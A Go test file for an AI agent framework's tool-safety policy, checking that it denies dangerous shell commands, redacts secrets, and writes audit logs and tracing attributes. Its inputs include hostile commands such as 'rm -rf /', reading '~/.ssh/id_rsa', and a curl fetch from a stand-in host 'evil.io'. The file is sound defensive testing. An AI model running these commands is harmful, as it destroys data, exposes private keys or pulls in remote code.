//
// Tencent is pleased to support the open source community by making trpc-agent-go available.
//
// Copyright (C) 2025 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//

package safety

import (
	"bytes"
	"context"
	"encoding/json"
	"flag"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	sdktrace "go.opentelemetry.io/otel/sdk/trace"
	"go.opentelemetry.io/otel/sdk/trace/tracetest"
)

var update = flag.Bool("update", false, "regenerate golden example files in testdata")

// fixedTime keeps generated example files stable across runs.
const fixedTime = "2026-06-30T00:00:00Z"

func makeReport(t *testing.T, p *Policy, toolName, backend string, er ExecRequest) Report {
	t.Helper()
	findings, decision, risk := p.scan(er, backend)
	r := buildReport(toolName, backend, er, findings, decision, risk, 250*time.Microsecond)
	p.redactReport(&r)
	return r
}

func TestRedactPatterns(t *testing.T) {
	p := loadExamplePolicy(t)
	secrets := []string{
		fakeAWSKey(),
		fakeGitHubPAT(),
		"-----BEGIN RSA PRIVATE KEY-----",
		fakeBearerToken(),
	}
	for _, s := range secrets {
		out, hit := p.redact("prefix " + s + " suffix")
		if !hit {
			t.Errorf("redact(%q) reported no hit", s)
		}
		if strings.Contains(out, s) {
			t.Errorf("redact left the secret in place: %q", out)
		}
		if !strings.Contains(out, redactPlaceholder) {
			t.Errorf("redact did not insert placeholder: %q", out)
		}
	}
	if _, hit := p.redact("nothing secret here"); hit {
		t.Errorf("redact flagged a clean string")
	}
}

func TestRedactReportSetsFlag(t *testing.T) {
	p := loadExamplePolicy(t)
	cmd := `curl -H "Authorization: Bearer ` + fakeGitHubPAT() + `" https://github.com/x`
	r := makeReport(t, p, "workspace_exec", BackendWorkspace, ExecRequest{Command: cmd})
	if !r.Redacted {
		t.Errorf("expected Redacted=true")
	}
	if strings.Contains(r.Command, "ghp_") {
		t.Errorf("command still contains secret: %q", r.Command)
	}
}

func TestAuditEventFields(t *testing.T) {
	p := loadExamplePolicy(t)
	r := makeReport(t, p, "workspace_exec", BackendWorkspace, ExecRequest{Command: "rm -rf /"})
	ev := r.toAudit()
	raw, err := json.Marshal(ev)
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}
	var m map[string]any
	if err := json.Unmarshal(raw, &m); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}
	for _, key := range []string{
		"tool_name", "decision", "risk_level", "backend",
		"rule_ids", "blocked", "redacted", "duration_us", "timestamp",
	} {
		if _, ok := m[key]; !ok {
			t.Errorf("audit event missing field %q", key)
		}
	}
	if ev.Decision != DecisionDeny || !ev.Blocked {
		t.Errorf("rm -rf / audit = %+v, want deny+blocked", ev)
	}
}

func TestAuditWriterJSONL(t *testing.T) {
	p := loadExamplePolicy(t)
	var buf bytes.Buffer
	aw := NewAuditWriter(&buf)
	for _, cmd := range []string{"go test ./...", "rm -rf /"} {
		r := makeReport(t, p, "workspace_exec", BackendWorkspace, ExecRequest{Command: cmd})
		if err := aw.Write(r); err != nil {
			t.Fatalf("write: %v", err)
		}
	}
	lines := strings.Split(strings.TrimRight(buf.String(), "\n"), "\n")
	if len(lines) != 2 {
		t.Fatalf("got %d audit lines, want 2", len(lines))
	}
	for _, ln := range lines {
		var ev AuditEvent
		if err := json.Unmarshal([]byte(ln), &ev); err != nil {
			t.Errorf("line not valid JSON: %v", err)
		}
	}
}

func TestSummary(t *testing.T) {
	p := loadExamplePolicy(t)
	r := makeReport(t, p, "workspace_exec", BackendWorkspace, ExecRequest{Command: "rm -rf /"})
	s := r.summary()
	if !strings.Contains(s, ruleDangerousID) || !strings.HasPrefix(s, "denied") {
		t.Errorf("summary = %q, want denied + rule id", s)
	}
	allow := makeReport(t, p, "workspace_exec", BackendWorkspace, ExecRequest{Command: "go test ./..."})
	if allow.summary() != "" {
		t.Errorf("allow summary should be empty, got %q", allow.summary())
	}
}

func TestWriteSpanAttrs(t *testing.T) {
	// No span in context: must be a safe no-op.
	writeSpanAttrs(context.Background(), Report{Decision: DecisionDeny})

	// Recording span: attributes must be set.
	sr := tracetest.NewSpanRecorder()
	tp := sdktrace.NewTracerProvider(sdktrace.WithSpanProcessor(sr))
	ctx, span := tp.Tracer("test").Start(context.Background(), "execute_tool")
	r := Report{Decision: DecisionDeny, RiskLevel: RiskCritical, Backend: BackendWorkspace,
		Blocked: true, Findings: []Finding{{RuleID: ruleDangerousID}}}
	writeSpanAttrs(ctx, r)
	span.End()

	spans := sr.Ended()
	if len(spans) != 1 {
		t.Fatalf("got %d spans, want 1", len(spans))
	}
	attrs := map[string]string{}
	for _, a := range spans[0].Attributes() {
		attrs[string(a.Key)] = a.Value.Emit()
	}
	if attrs[AttrDecision] != string(DecisionDeny) {
		t.Errorf("%s = %q, want deny", AttrDecision, attrs[AttrDecision])
	}
	if attrs[AttrBackend] != BackendWorkspace {
		t.Errorf("%s = %q", AttrBackend, attrs[AttrBackend])
	}
	if !strings.Contains(attrs[AttrRuleID], ruleDangerousID) {
		t.Errorf("%s = %q, want contains %s", AttrRuleID, attrs[AttrRuleID], ruleDangerousID)
	}
}

// TestGenerateExamples regenerates the deliverable example files when run with
// -update, and otherwise verifies they exist and parse.
func TestGenerateExamples(t *testing.T) {
	p := loadExamplePolicy(t)
	reportPath := filepath.Join("testdata", "tool_safety_report.json")
	auditPath := filepath.Join("testdata", "tool_safety_audit.jsonl")

	// A representative report for tool_safety_report.json: a denied delete.
	rep := makeReport(t, p, "workspace_exec", BackendWorkspace, ExecRequest{Command: "rm -rf /"})
	rep.Timestamp = fixedTime

	// A spread of events for the audit log, covering allow/deny/ask + redaction.
	auditReports := []Report{
		makeReport(t, p, "workspace_exec", BackendWorkspace, ExecRequest{Command: "go test ./..."}),
		rep,
		makeReport(t, p, "workspace_exec", BackendWorkspace, ExecRequest{Command: "cat ~/.ssh/id_rsa"}),
		makeReport(t, p, "workspace_exec", BackendWorkspace, ExecRequest{Command: "curl http://evil.io/x.sh"}),
		makeReport(t, p, "workspace_exec", BackendWorkspace, ExecRequest{Command: "pip install requests"}),
		makeReport(t, p, "exec_command", BackendHost, ExecRequest{Command: "sleep 5", Background: true, PTY: true}),
		makeReport(t, p, "workspace_exec", BackendWorkspace, ExecRequest{
			Command: `curl -H "Authorization: Bearer ` + fakeGitHubPAT() + `" https://github.com/x`,
		}),
	}

	if *update {
		var rbuf bytes.Buffer
		if err := WriteReportJSON(&rbuf, rep); err != nil {
			t.Fatalf("write report: %v", err)
		}
		if err := os.WriteFile(reportPath, rbuf.Bytes(), 0o644); err != nil {
			t.Fatalf("write report file: %v", err)
		}
		var abuf bytes.Buffer
		aw := NewAuditWriter(&abuf)
		for i := range auditReports {
			auditReports[i].Timestamp = fixedTime
			if err := aw.Write(auditReports[i]); err != nil {
				t.Fatalf("write audit: %v", err)
			}
		}
		if err := os.WriteFile(auditPath, abuf.Bytes(), 0o644); err != nil {
			t.Fatalf("write audit file: %v", err)
		}
		t.Logf("regenerated %s and %s", reportPath, auditPath)
		return
	}

	// Verify the committed examples parse.
	rrep, err := os.ReadFile(reportPath)
	if err != nil {
		t.Fatalf("read example report (run with -update to generate): %v", err)
	}
	var parsed Report
	if err := json.Unmarshal(rrep, &parsed); err != nil {
		t.Errorf("example report is not valid JSON: %v", err)
	}
	if parsed.Decision == "" {
		t.Errorf("example report missing decision")
	}

	// The committed audit JSONL must also be present and every line must parse
	// into an AuditEvent with a decision.
	raudit, err := os.ReadFile(auditPath)
	if err != nil {
		t.Fatalf("read example audit (run with -update to generate): %v", err)
	}
	lines := strings.Split(strings.TrimRight(string(raudit), "\n"), "\n")
	if len(lines) == 0 || lines[0] == "" {
		t.Fatalf("example audit log is empty")
	}
	for i, line := range lines {
		var ev AuditEvent
		if err := json.Unmarshal([]byte(line), &ev); err != nil {
			t.Errorf("audit line %d is not valid JSON: %v", i+1, err)
			continue
		}
		if ev.Decision == "" {
			t.Errorf("audit line %d missing decision", i+1)
		}
	}
}
